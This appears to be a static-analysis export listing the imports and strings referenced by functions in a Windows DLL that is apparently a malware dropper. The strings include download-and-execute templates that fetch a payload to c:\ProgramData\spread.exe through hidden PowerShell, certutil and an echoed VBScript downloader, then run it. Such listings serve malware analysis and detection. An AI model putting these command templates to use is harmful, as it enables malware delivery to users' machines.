reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1000102b	0x1000c134	import	0x10001000	WS2_32.dll.WSAStartup
0x10001036	0x10010d04	string	0x10001000	127.0.0.1
0x10001040	0x1000c11c	import	0x10001000	WS2_32.dll.inet_addr
0x10001050	0x1000c130	import	0x10001000	WS2_32.dll.socket
0x10001059	0x1000c128	import	0x10001000	WS2_32.dll.htons
0x1000106c	0x1000c124	import	0x10001000	WS2_32.dll.connect
0x10001080	0x1000c120	import	0x10001000	WS2_32.dll.closesocket
0x10001086	0x1000c12c	import	0x10001000	WS2_32.dll.WSACleanup
0x10001108	0x100109b8	string	0x100010b0	c:/ProgramData/spread.exe
0x1000110d	0x100109b8	string	0x100010b0	c:/ProgramData/spread.exe
0x10001119	0x100109d8	string	0x100010b0	cmd /c powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('%s', '%s');%s
0x1000111f	0x1000c114	import	0x100010b0	USER32.dll.wsprintfA
0x10001125	0x1000c014	import	0x100010b0	KERNEL32.dll.WinExec
0x10001139	0x1000c000	import	0x100010b0	KERNEL32.dll.Sleep
0x10001146	0x1000c004	import	0x100010b0	KERNEL32.dll.GetFileAttributesA
0x1000114c	0x10010a40	string	0x100010b0	c:\ProgramData\spread.exe
0x1000118f	0x10010a40	string	0x100010b0	c:\ProgramData\spread.exe
0x10001194	0x10010a40	string	0x100010b0	c:\ProgramData\spread.exe
0x100011a5	0x10010a5c	string	0x100010b0	cmd /c certutil.exe -urlcache -split -f %s %s&&%s
0x100011ab	0x1000c114	import	0x100010b0	USER32.dll.wsprintfA
0x100011c6	0x10010a40	string	0x100010b0	c:\ProgramData\spread.exe
0x100011d2	0x10010d20	string	0x100010b0	URLDownloadToFil
0x10001203	0x1000c008	import	0x100010b0	KERNEL32.dll.LoadLibraryA
0x10001210	0x1000c00c	import	0x100010b0	KERNEL32.dll.GetProcAddress
0x1000121a	0x10010a40	string	0x100010b0	c:\ProgramData\spread.exe
0x1000122e	0x1000c010	import	0x100010b0	KERNEL32.dll.FreeLibrary
0x10001236	0x10010a90	string	0x100010b0	cmd /c c:\ProgramData\spread.exe
0x1000123d	0x1000c004	import	0x100010b0	KERNEL32.dll.GetFileAttributesA
0x10001243	0x10010a40	string	0x100010b0	c:\ProgramData\spread.exe
0x1000127d	0x10010ab4	string	0x100010b0	cmd /c echo on error resume next >c:\ProgramData\vbs.vbs
0x1000128d	0x10010af0	string	0x100010b0	cmd /c echo with wscript:if .arguments.count^<2 then .quit:end if >>c:\ProgramData\vbs.vbs
0x1000129d	0x10010b50	string	0x100010b0	cmd /c echo set aso=.createobject("adodb.stream"):set web=createobject("microsoft.xmlhttp") >>c:\ProgramData\vbs.vbs
0x100012ad	0x10010bc8	string	0x100010b0	cmd /c echo web.open "get",.arguments(0),0:web.send:if web.status^>200 then quit >>c:\ProgramData\vbs.vbs
0x100012bd	0x10010c38	string	0x100010b0	cmd /c echo aso.type=1:aso.open:aso.write web.responsebody:aso.savetofile .arguments(1),2:end with >>c:\ProgramData\vbs.vbs
0x100012cb	0x10010cb4	string	0x100010b0	c:\ProgramData\spread.exe
0x100012dc	0x10010cd0	string	0x100010b0	cmd /c cscript c:\ProgramData\vbs.vbs
0x100012e1	0x10010cf8	string	0x100010b0	%s %s %s
0x100012e7	0x1000c114	import	0x100010b0	USER32.dll.wsprintfA
0x10001302	0x10010a40	string	0x100010b0	c:\ProgramData\spread.exe
0x1000133f	0x10010d10	string	0x10001330	C:\ProgramData\
0x10001344	0x1000c13c	import	0x10001330	imagehlp.dll.MakeSureDirectoryPathExists
0x1000134a	0x10012770	string	0x10001330	0xCCCCCC8Dsb361
0x1000169d	0x1000c038	import	0x10001698	KERNEL32.dll.SetUnhandledExceptionFilter
0x100016a6	0x1000c034	import	0x10001698	KERNEL32.dll.UnhandledExceptionFilter
0x100016b1	0x1000c03c	import	0x10001698	KERNEL32.dll.GetCurrentProcess
0x100016b8	0x1000c040	import	0x10001698	KERNEL32.dll.TerminateProcess
0x10001b3c	0x1000c054	import	0x10001b08	KERNEL32.dll.GetSystemTimeAsFileTime
0x10001b4b	0x1000c050	import	0x10001b08	KERNEL32.dll.GetCurrentThreadId
0x10001b54	0x1000c04c	import	0x10001b08	KERNEL32.dll.GetCurrentProcessId
0x10001b61	0x1000c048	import	0x10001b08	KERNEL32.dll.QueryPerformanceCounter
0x10001ba9	0x1000c058	import	0x10001ba4	KERNEL32.dll.InitializeSListHead
0x10001cc0	0x1000c05c	import	0x10001beb	KERNEL32.dll.IsDebuggerPresent
0x10001cdf	0x1000c038	import	0x10001beb	KERNEL32.dll.SetUnhandledExceptionFilter
0x10001ce9	0x1000c034	import	0x10001beb	KERNEL32.dll.UnhandledExceptionFilter
0x1000203a	0x1000240e	string	0x10001fc0	UVWS
0x10002192	0x1000c068	import	0x1000218c	KERNEL32.dll.InterlockedFlushSList
0x10002447	0x10002452	string	0x1000243e	_^[]
0x100024cf	0x1000c070	import	0x100024c1	KERNEL32.dll.GetLastError
0x10002548	0x1000c074	import	0x100024c1	KERNEL32.dll.SetLastError
0x100025f3	0x1000c080	import	0x100025dd	KERNEL32.dll.DeleteCriticalSection
0x10002642	0x100026a7	string	0x1000260c	_^[]
0x10002670	0x1000c00c	import	0x1000260c	KERNEL32.dll.GetProcAddress
0x100026e4	0x1000c098	import	0x100026ac	KERNEL32.dll.LoadLibraryExW
0x100026f0	0x1000c070	import	0x100026ac	KERNEL32.dll.GetLastError
0x100026fe	0x1000c098	import	0x100026ac	KERNEL32.dll.LoadLibraryExW
0x10002715	0x10002728	string	0x100026ac	^_[]
0x10002720	0x1000c010	import	0x100026ac	KERNEL32.dll.FreeLibrary
0x10002731	0x1000c244	string	0x1000272d	FlsAlloc
0x1000273b	0x1000c244	string	0x1000272d	FlsAlloc
0x1000276b	0x1000c258	string	0x10002767	FlsFree
0x10002775	0x1000c258	string	0x10002767	FlsFree
0x10002798	0x1000c094	import	0x10002767	KERNEL32.dll.TlsFree
0x100027a5	0x1000c268	string	0x100027a1	FlsGetValue
0x100027af	0x1000c268	string	0x100027a1	FlsGetValue
0x100027d2	0x1000c08c	import	0x100027a1	KERNEL32.dll.TlsGetValue
0x100027df	0x1000c27c	string	0x100027db	FlsSetValue
0x100027e9	0x1000c27c	string	0x100027db	FlsSetValue
0x1000280f	0x1000c090	import	0x100027db	KERNEL32.dll.TlsSetValue
0x1000281c	0x1000c290	string	0x10002818	InitializeCriticalSectionEx
0x10002826	0x1000c290	string	0x10002818	InitializeCriticalSectionEx
0x10002855	0x1000c084	import	0x10002818	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x100028b3	0x1000c010	import	0x10002898	KERNEL32.dll.FreeLibrary
0x100028fb	0x10002908	string	0x100028f0	]_^[
0x10002a98	0x10002ab1	string	0x10002a83	;u\fu
0x10002da8	0x1000c03c	import	0x10002d87	KERNEL32.dll.GetCurrentProcess
0x10002daf	0x1000c040	import	0x10002d87	KERNEL32.dll.TerminateProcess
0x10002dc1	0x1000c09c	import	0x10002d87	KERNEL32.dll.ExitProcess
0x10002dca	0x1000c064	import	0x10002dc8	KERNEL32.dll.GetModuleHandleW
0x10002e2c	0x1000c0a0	import	0x10002e0c	KERNEL32.dll.GetModuleHandleExW
0x10002e37	0x1000cac4	string	0x10002e0c	CorExitProcess
0x10002e3f	0x1000c00c	import	0x10002e0c	KERNEL32.dll.GetProcAddress
0x10002e62	0x1000c010	import	0x10002e0c	KERNEL32.dll.FreeLibrary
0x10002ef0	0x1000c0a4	import	0x10002eb2	KERNEL32.dll.GetModuleFileNameA
0x1000317f	0x1000319a	string	0x10003149	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x100034a6	0x10003436	string	0x10003487	j\fh0
0x100035c4	0x10003554	string	0x100034f6	j Y+
0x1000397a	0x1000c0b0	import	0x10003964	KERNEL32.dll.HeapFree
0x1000398c	0x1000c070	import	0x10003964	KERNEL32.dll.GetLastError
0x100039d0	0x1000c0b4	import	0x1000399e	KERNEL32.dll.HeapAlloc
0x10003a51	0x10005b6a	string	0x10003a46	j,hp
0x10003aca	0x1000c0b4	import	0x10003a89	KERNEL32.dll.HeapAlloc
0x10003d44	0x10003c65	string	0x10003d25	j\bhp
0x10003f0b	0x1000c070	import	0x10003f07	KERNEL32.dll.GetLastError
0x10003f73	0x1000c074	import	0x10003f07	KERNEL32.dll.SetLastError
0x10003f90	0x1000c070	import	0x10003f8b	KERNEL32.dll.GetLastError
0x10003ff9	0x1000c074	import	0x10003f8b	KERNEL32.dll.SetLastError
0x10004002	0x1000c074	import	0x10003f8b	KERNEL32.dll.SetLastError
